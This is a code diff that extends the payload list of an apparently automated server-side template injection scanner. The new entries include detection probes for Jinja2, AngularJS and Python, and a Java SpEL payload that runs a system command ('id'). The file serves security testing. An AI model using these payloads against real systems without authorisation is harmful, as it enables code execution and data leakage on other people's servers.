@@ -14,6 +14,12 @@ def run_ssti_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
         "{{config}}", # Jinja2 info leak
         "{{self}}",
         "#{7*7}", # Velocity
+        "{{1337*1337}}", # Unique Math
+        "{{'b'+'p'}}", # String Concat
+        "[[7*7]]", # AngularJS
+        "{{7*'7'}}", # Type juggling
+        "{{ [].class.base }}", # Python MRO
+        "T(java.lang.Runtime).getRuntime().exec('id')" # Java SpEL (Aggressive)
     ]
     
     fields = scenario.config.get("fields", ["q", "name", "template"])
